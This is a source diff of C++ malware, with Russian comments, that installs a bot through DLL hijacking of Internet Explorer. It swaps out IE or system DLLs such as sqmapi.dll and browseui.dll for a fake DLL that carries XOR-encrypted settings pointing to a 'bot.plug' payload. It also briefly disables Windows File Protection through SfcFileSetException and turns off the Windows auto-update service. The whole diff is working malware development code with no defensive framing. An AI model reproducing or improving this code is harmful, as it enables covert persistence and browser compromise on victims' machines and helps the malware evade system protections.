@@ -12,6 +12,8 @@
 #include "Utils.h"
 #include "getsec.h"
 #include "StrConsts.h"
+#include "Crypt.h"
+#include "Installer.h"
 
 #include "BotSocket.h"
 
@@ -52,8 +54,8 @@ LPBYTE LookupAnchor(const LPVOID Buffer, DWORD BufferSize, const LPBYTE Anchor, 
 // NULL - если произошли ошибки
 LPBYTE CreateFakeDllWithBuiltingSettings(
 	const char* CryptKey,
-	const wstring& DllName,
-	const wstring& BotPlugPath,
+	const char* DllName,
+	const char* BotPlugPath,
 	const LPVOID DllBody,
 	const DWORD  DllSize
 	)
@@ -62,31 +64,27 @@ LPBYTE CreateFakeDllWithBuiltingSettings(
 	const char RealDllNameAnchor[] = "5BC11231-93CF-4815-8B45-7E7579F39561";
 	const char BotPlugPathAnchor[] = "4533703D-7B7F-48FE-A3DA-3155AC13EACB";
 
+	FAKEDLLDBG( "FDI", "key: %s, dll: '%s', bot.plug: '%s'", CryptKey, DllName, BotPlugPath );
+
 	struct AnchorDesc
 	{
-		LPBYTE Anchor;
-		DWORD  AnchorSize;
-		DWORD  AnchorBufferSize;
-		
-		LPBYTE Value;
-		DWORD  ValueSize;
+		char* Anchor;
+		DWORD  AnchorBufferSize;	
+		const char* Value;
 		bool   EncryptValue;
 
 	} ReplaceByAnchorList[] = 
 	{
-		{ (LPBYTE)&CryptKeyAnchor, sizeof(CryptKeyAnchor), 
-		  16, 
-		  (LPBYTE)&CryptKey, 16, false 
+		{ (char*)CryptKeyAnchor, 32, 
+		  CryptKey, false 
 		},
 		
-		{ (LPBYTE)&RealDllNameAnchor, sizeof(RealDllNameAnchor), 
-		  MAX_PATH * sizeof(WCHAR), 
-		  (LPBYTE)DllName.t_str(), DllName.Length() * sizeof(WCHAR), true 
+		{ (char*)RealDllNameAnchor, MAX_PATH, 
+		  DllName, true 
 		},
 
-		{ (LPBYTE)&BotPlugPathAnchor, sizeof(BotPlugPathAnchor), 
-		  MAX_PATH * sizeof(WCHAR), 
-		  (LPBYTE)BotPlugPath.t_str(), BotPlugPath.Length() * sizeof(WCHAR), true 
+		{ (char*)BotPlugPathAnchor, MAX_PATH, 
+		  BotPlugPath, true 
 		}
 	};
 
@@ -95,30 +93,33 @@ LPBYTE CreateFakeDllWithBuiltingSettings(
 	m_memcpy(NewDllBody, DllBody, DllSize);
 
 	DWORD ReplacedCount = 0;
+	int lenCryptKey = m_lstrlen(CryptKey);
+
 	for (DWORD i = 0; i < ARRAYSIZE(ReplaceByAnchorList); i++)
 	{
 		AnchorDesc& ad = ReplaceByAnchorList[i];
 		
 		// Если данных больше, чем буффер, берем следующую настойку
-		if (ad.ValueSize > ad.AnchorBufferSize) continue;
+		int size = m_lstrlen(ad.Value) + 1;
+		if( size > ad.AnchorBufferSize ) continue;
 
 		// Ищем якорь
-		LPBYTE AnchorBuffer = LookupAnchor(NewDllBody, DllSize, ad.Anchor, ad.AnchorSize);
+		int sizeAnchor = m_lstrlen(ad.Anchor);
+		LPBYTE AnchorBuffer = LookupAnchor( NewDllBody, DllSize, (BYTE*)ad.Anchor, sizeAnchor );
 
 		// Если якорь не найден - берем следующую настойку
-		if (AnchorBuffer == NULL) continue;
+		if( AnchorBuffer == NULL ) continue;
+
 
 		// Обнуляем найденный буфер
-		m_memset(AnchorBuffer, 0, ad.AnchorBufferSize);
+		m_memset( AnchorBuffer, 0, ad.AnchorBufferSize );
 
 		// Копируем данные в буффер
-		m_memcpy(AnchorBuffer, ad.Value, ad.ValueSize);
+		m_memcpy( AnchorBuffer, ad.Value, size );
 
 		// Если стоит признак шифровать - шифруем весь буффер
-		if (ad.EncryptValue) 
-		{
-			XorCrypt((const LPBYTE)&CryptKey, 16, AnchorBuffer, ad.AnchorBufferSize);
-		}
+		if( ad.EncryptValue ) 
+			XORCrypt::Crypt( (char*)CryptKey, (BYTE*)AnchorBuffer, ad.AnchorBufferSize );
 
 		ReplacedCount++;
 	}
@@ -171,24 +172,18 @@ DWORD GetIeVersion()
 
 // Незначительно меняет имя исходной длл путем добавления 
 // в начало имени случайного символа
-wstring CreateRealDllName(const wstring& DllName)
+char* CreateRealDllName(const char* DllName, char* newDllName )
 {
-	WCHAR chars[] = L"abcdefghiklmnopqrstuvwxyz";
-	WCHAR c[] = {chars[(DWORD)pGetTickCount() % ARRAYSIZE(chars)], 0};
-	
-	wstring result;
-	result += c;
-	result += DllName;
-	
-	return result;
+	newDllName[0] = 'a' + ((DWORD)pGetTickCount() % ('z' - 'a' + 1));
+	m_lstrcpy( &newDllName[1], DllName );
+	return newDllName;
 }
-
 
 // Ф-ция отключает слежение SFC за файлом на одну минуту.(http://bitsum.com/aboutwfp.asp/)
 // За это время надо заменить файл.
-bool SetSfcExceptionForOneMinute(const WCHAR* Path)
+bool SetSfcExceptionForOneMinute( const char* pathFile )
 {
-	FAKEDLLDBG("AddFilePathToSfcExceptionList", "Started with Path='%S'", Path);
+	FAKEDLLDBG("AddFilePathToSfcExceptionList", "Started with Path='%s'", pathFile);
 
 	// Проверяет на факт того, что файл защищается SFC
 	// Возвращает TRUE если защищается и FALSE если нет
@@ -219,17 +214,20 @@ bool SetSfcExceptionForOneMinute(const WCHAR* Path)
 	if (SfcIsFileProtected == NULL) return false;
 	if (SfcFileSetException == NULL) return false;
 
+	wchar_t* Path = AnsiToUnicode( (char*)pathFile, 0 );
 	// Если файл не защищается - просто завершаемся с положительным результатом
 	BOOL FileProtectedBySfc = SfcIsFileProtected(NULL, Path);
 	FAKEDLLDBG("AddFilePathToSfcExceptionList", "FileProtectedBySfc=%d", FileProtectedBySfc);
 
-	if (FileProtectedBySfc == FALSE) return true;
-
-	DWORD SfcFileSetExceptionResult = SfcFileSetException(NULL, Path, -1);
-	FAKEDLLDBG("AddFilePathToSfcExceptionList", "SfcFileSetExceptionResult=%u", 
-		SfcFileSetExceptionResult);
-
-	return (SfcFileSetExceptionResult == 0);
+	bool ret = true;
+	if( FileProtectedBySfc ) 
+	{
+		DWORD SfcFileSetExceptionResult = SfcFileSetException(NULL, Path, -1);
+		FAKEDLLDBG("AddFilePathToSfcExceptionList", "SfcFileSetExceptionResult=%u", SfcFileSetExceptionResult);
+		ret = (SfcFileSetExceptionResult == 0);
+	}
+	MemFree(Path);
+	return ret;
 }
 
 // В зависимости от версии IE :
@@ -237,30 +235,31 @@ bool SetSfcExceptionForOneMinute(const WCHAR* Path)
 // 2) выбирает путь ДЛЛ, куда будет перемещена оригинальная ДЛЛ
 // 3) флаг необходимости перемещения FakeDllPath в RealDllPath
 bool SelectTargetIeDll(
-	wstring & FakeDllPath,
-	wstring & RealDllPath,
+	char* FakeDllPath,
+	char* RealDllPath,
 	bool & MoveFakeToRealBeforeFakeSave
 	)
 {
-	const WCHAR * Ie8Files[] = 
+	const char* Ie8Files[] = 
 	{
-		L"sqmapi.dll",
-		L"xpshims.dll"
+		"sqmapi.dll",
+		"xpshims.dll"
 		//L"ieproxy.dll"
 	};
 
-	const WCHAR * Ie7Files[] = 
+	const char* Ie7Files[] = 
 	{
-		L"custsat.dll",
-		L"ieproxy.dll"
+		"custsat.dll",
+		"ieproxy.dll"
 	};
 
-	const WCHAR * Ie6Files[] = 
+	const char* Ie6Files[] = 
 	{
-		 L"browseui.dll"
+		 "browseui.dll"
 	};
 
-	WCHAR PathBuffer[2* MAX_PATH];
+	char ProgramFilesPath[MAX_PATH];
+	char System32Path[MAX_PATH];
 	BOOL  DirectoryObtained = FALSE;
 	DWORD IeVersion = GetIeVersion();
 
@@ -272,37 +271,28 @@ bool SelectTargetIeDll(
 	if (IeVersion > 8) return false;
 
 	// Получаем путь к Program Files
-	m_memset(PathBuffer, 0, sizeof(PathBuffer));
-	DirectoryObtained = (BOOL)pSHGetSpecialFolderPathW(NULL, PathBuffer, CSIDL_PROGRAM_FILES, false);
+	DirectoryObtained = (BOOL)pSHGetSpecialFolderPathA(NULL, ProgramFilesPath, CSIDL_PROGRAM_FILES, false);
 	if (DirectoryObtained == FALSE) return false;
-
-	wstring ProgramFilesPath = PathBuffer;
-
 	// Получаем путь к System32
-	m_memset(PathBuffer, 0, sizeof(PathBuffer));
-	DirectoryObtained = (BOOL)pSHGetSpecialFolderPathW(NULL, PathBuffer, CSIDL_SYSTEM, false);
+	DirectoryObtained = (BOOL)pSHGetSpecialFolderPathW(NULL, System32Path, CSIDL_SYSTEM, false);
 	if (DirectoryObtained == FALSE) return false;
-	wstring System32Path = PathBuffer;
 
 	DWORD   RandNumber = (DWORD)pGetTickCount();
-	wstring DllName;
-	wstring DllDirectory;
+	const char* DllName;
 
 	if (IeVersion == 6) 
 	{
-		//DllDirectory = System32Path + wstring(L"\\macromed\\flash\\");
-		//DllName = L"flash.ocx";
-		
 		// Для IE 6 будем делать подмену системной DLLки путем создания с таким же именем 
 		// в папке IE. Поскольку порядок загрузки начинается с папки с программой,
 		// загрузка не по абсолютному пути начнется с нашей DLLки.
-
 		MoveFakeToRealBeforeFakeSave = false;
-
 		DllName = Ie6Files[RandNumber % ARRAYSIZE(Ie6Files)];;
 
-		FakeDllPath = ProgramFilesPath + wstring(L"\\Internet Explorer\\") + DllName;
-		RealDllPath = System32Path + wstring(L"\\") + DllName;
+		m_lstrcpy( FakeDllPath, ProgramFilesPath );
+		pPathAppendA( FakeDllPath, "Internet Explorer");
+		pPathAppendA( FakeDllPath, DllName );
+		m_lstrcpy( RealDllPath,  System32Path );
+		pPathAppendA( RealDllPath, DllName );
 		
 		return true;
 	}
@@ -311,21 +301,22 @@ bool SelectTargetIeDll(
 	// Подмена делается 
 
 	if (IeVersion == 7) 
-	{
-		DllDirectory = ProgramFilesPath + wstring(L"\\Internet Explorer\\");
 		DllName = Ie7Files[RandNumber % ARRAYSIZE(Ie7Files)];
-	}
 		
 	if (IeVersion == 8) 
-	{
-		DllDirectory = ProgramFilesPath + wstring(L"\\Internet Explorer\\");
 		DllName = Ie8Files[RandNumber % ARRAYSIZE(Ie8Files)];
-	}
+
+	m_lstrcpy( FakeDllPath, ProgramFilesPath );
+	pPathAppendA( FakeDllPath, "Internet Explorer" );
+	pPathAppendA( FakeDllPath, DllName );
+
+	char newDllName[64];
+	CreateRealDllName( DllName, newDllName );
+	m_lstrcpy( RealDllPath, ProgramFilesPath );
+	pPathAppendA( RealDllPath, "Internet Explorer" );
+	pPathAppendA( RealDllPath, newDllName );
 
 	MoveFakeToRealBeforeFakeSave = true;
-
-	FakeDllPath = DllDirectory + DllName;
-	RealDllPath = DllDirectory + CreateRealDllName(DllName);
 
 	return true;
 }
@@ -415,7 +406,7 @@ void TryDisableAutoUpdateService()
 }
 
 // Ф-ция установки 
-BOOL InstallForIe( BYTE* bodyBotPlug, DWORD sizeBotPlug )
+BOOL InstallForIe()
 {
 	LPBYTE FakeDllWithSettings = NULL;
 	BOOL   result = FALSE;
@@ -431,46 +422,26 @@ BOOL InstallForIe( BYTE* bodyBotPlug, DWORD sizeBotPlug )
 		// Проверка на встроенность тела FakeDll
 		if (FakeDllBody == NULL) break;
 
-		// Generate crypt key
-		GUID CryptKey = GenerateCryptKey();
-
-		// Generate random path for bot.plug (User\AppData)
-		wstring BotPlugPath;
-		bool PlugPathGenerated = GenerateRandomPlugPath(BotPlugPath);
-		FAKEDLLDBG("InstallForIe", 
-			"GenerateRandomPlugPath() result=%d path='%S'", PlugPathGenerated, BotPlugPath.t_str());
-
 		// Выбираем дллку для замещения.
-		wstring FakeDllPath;
-		wstring RealDllPath;
-		bool    MoveFakeToRealBeforeFakeSave = false;
+		char FakeDllPath[MAX_PATH];
+		char RealDllPath[MAX_PATH];
+		bool MoveFakeToRealBeforeFakeSave = false;
 
-		bool DllSelected = SelectTargetIeDll(FakeDllPath, RealDllPath, MoveFakeToRealBeforeFakeSave);
+		bool DllSelected = SelectTargetIeDll( FakeDllPath, RealDllPath, MoveFakeToRealBeforeFakeSave );
 		FAKEDLLDBG("InstallForIe", 
-			"SelectTargetIeDll() result=%d FakeDllPath='%S' RealDllPath='%S'", 
-			DllSelected, FakeDllPath.t_str(), RealDllPath.t_str());
+			"SelectTargetIeDll() result=%d FakeDllPath='%s' RealDllPath='%s'", 
+			DllSelected, FakeDllPath, RealDllPath );
 
 		if (!DllSelected) break;
 
-		DWORD  PlugSize = sizeBotPlug;
-		LPBYTE Plug = bodyBotPlug;
-		FAKEDLLDBG("InstallForIe", "LoadBotPlugBody result module=0x%X size=%u", Plug, PlugSize);
-		
-		XorCrypt((LPBYTE)&CryptKey, sizeof(GUID), Plug, PlugSize);
-
-		// Записываем шифрованое тело бота в файл
-		DWORD PlugWritten = File::WriteBufferW(BotPlugPath.t_str(), Plug, PlugSize);
-		FAKEDLLDBG("InstallForIe", "WriteBufferW() to '%S' results: PlugWritten=%u PlugSize=%u", 
-			BotPlugPath.t_str(), PlugWritten, PlugSize);
-
-		// Если недозаписалось - ошибка
-		if (PlugSize != PlugWritten) break;
-
+		// Generate crypt key
+		char* CryptKey = MakeMachineID();
 		// Встраиваем в фейковую длл все параметры, необходимые для работы 
 		// (crypt key, new target dll path, path to crypted botplug) 
-		FakeDllWithSettings = CreateFakeDllWithBuiltingSettings(CryptKey, 
-			RealDllPath, BotPlugPath, FakeDllBody, FakeDllSize);
+		FakeDllWithSettings = CreateFakeDllWithBuiltingSettings( CryptKey, 
+			RealDllPath, GetBotPlugFileName().t_str(), FakeDllBody, FakeDllSize );
 
+		STR::Free(CryptKey);
 		FAKEDLLDBG("InstallForIe", "CreateFakeDllWithBuiltingSettings() result=0x%X", FakeDllWithSettings);
 
 		if (FakeDllWithSettings == NULL) break;
@@ -486,9 +457,9 @@ BOOL InstallForIe( BYTE* bodyBotPlug, DWORD sizeBotPlug )
 
 			for (DWORD i = 0; i < MaxAttemptsCount; i++)
 			{
-				FAKEDLLDBG("InstallForIe", "Try to MoveFile(Src='%S',Dst='%S')", FakeDllPath.t_str(), RealDllPath.t_str());
+				FAKEDLLDBG( "InstallForIe", "Try to MoveFile(Src='%s',Dst='%s')", FakeDllPath, RealDllPath );
 
-				BOOL MoveResult = (BOOL)pMoveFileW(FakeDllPath.t_str(), RealDllPath.t_str());
+				BOOL MoveResult = (BOOL)pMoveFileA( FakeDllPath, RealDllPath );
 				
 				if (MoveResult == TRUE) break;
 
@@ -507,12 +478,12 @@ BOOL InstallForIe( BYTE* bodyBotPlug, DWORD sizeBotPlug )
 		}
 		
 		// Если переименованиме прошло успешно - сохраняем дллку
-		DWORD Written = File::WriteBufferW(FakeDllPath.t_str(), FakeDllWithSettings, FakeDllSize);
+		DWORD Written = File::WriteBufferA( FakeDllPath, FakeDllWithSettings, FakeDllSize );
 
 		FAKEDLLDBG("InstallForIe", "WriteBuffer for target dll.(Written=%u FakeDllSize=%u)",
 			Written, FakeDllSize);
 
-		if (Written != FakeDllSize) break;
+		if( Written != FakeDllSize ) break;
 
 		// Если всё прошло успешно - отключаем сервис обновления Windows
 		TryDisableAutoUpdateService();
@@ -522,7 +493,7 @@ BOOL InstallForIe( BYTE* bodyBotPlug, DWORD sizeBotPlug )
 	}
 	while (false);
 
-	if (FakeDllWithSettings != NULL) MemFree(FakeDllWithSettings);
+	if( FakeDllWithSettings ) MemFree(FakeDllWithSettings);
 
 	FAKEDLLDBG("InstallForIe", "Finished with result=%d",result);
 	return result;
@@ -539,7 +510,7 @@ extern "C" BOOL WINAPI Install( BYTE* bodyBotPlug, DWORD sizeBotPlug )
 
 	FAKEDLLDBG( "FakeInstall", "Started size bot plug=%d", sizeBotPlug );
 
-	DWORD res = InstallForIe( bodyBotPlug, sizeBotPlug );
+	DWORD res = InstallForIe();
 	if( res )
 	{
 		BOT::SaveSettings(true, false, false);
@@ -580,20 +551,12 @@ extern "C" BOOL WINAPI Install2( const char* fakeDll, BYTE* bodyBotPlug, DWORD s
 		return FALSE;
 	}
 	FAKEDLLDBG( "InstallFakeDll", "Подмена %s -> %s", fakeDll, origDll );
-	GUID CryptKey = GenerateCryptKey();
-	XorCrypt( (LPBYTE)&CryptKey, sizeof(GUID), bodyBotPlug, sizeBotPlug );
-	wstring botPlugPath;
-	GenerateRandomPlugPath(botPlugPath); //путь к бот плагу
-	DWORD writen = File::WriteBufferW( botPlugPath.t_str(), bodyBotPlug, sizeBotPlug );
-	if( writen != sizeBotPlug ) return FALSE;
-	FAKEDLLDBG( "InstallFakeDll", "bot.plug saved '%ls'", botPlugPath.t_str() );
 	DWORD  fakeDllSize = 0;
 	LPVOID fakeDllBody = GetBuiltinFakeDllBody(fakeDllSize);
 	if( fakeDllBody == 0 ) return FALSE;
-	wchar_t* worigDll = AnsiToUnicode( origDll, 0 );
-	wstring worigDll2(worigDll);
-	MemFree(worigDll);
-	BYTE* fakeDllBody2 = CreateFakeDllWithBuiltingSettings( CryptKey, worigDll2, botPlugPath, fakeDllBody, fakeDllSize );
+	char* CryptKey = MakeMachineID();
+	BYTE* fakeDllBody2 = CreateFakeDllWithBuiltingSettings( CryptKey, origDll, GetBotPlugFileName().t_str(), fakeDllBody, fakeDllSize );
+	STR::Free(CryptKey);
 	if( fakeDllBody2 )
 	{
 		char fakeDll2[MAX_PATH];
@@ -620,10 +583,16 @@ extern "C" BOOL WINAPI Install2( const char* fakeDll, BYTE* bodyBotPlug, DWORD s
 DWORD WINAPI FakeDllInstallerDllMain(HINSTANCE , DWORD reason, LPVOID )
 {
 //код для тестирования, ложится вместе c bot.plug и запускается "rundll32 bki.plug,qwe"
-//	BOT::Initialize();
-//	BYTE* data;
-//	DWORD size;
-//	data = File::ReadToBufferA( "bot.plug", size );
+/*
+	BOT::Initialize();
+	BYTE* data;
+	DWORD size;
+	data = File::ReadToBufferA( "bot.plug", size );
+	if (CryptBotPlug( data, size))
+	{
+		File::WriteBufferA(GetBotPlugFileName().t_str(), data, size);
+	}
+*/
 	switch (reason)
 	{
 		case DLL_PROCESS_ATTACH:
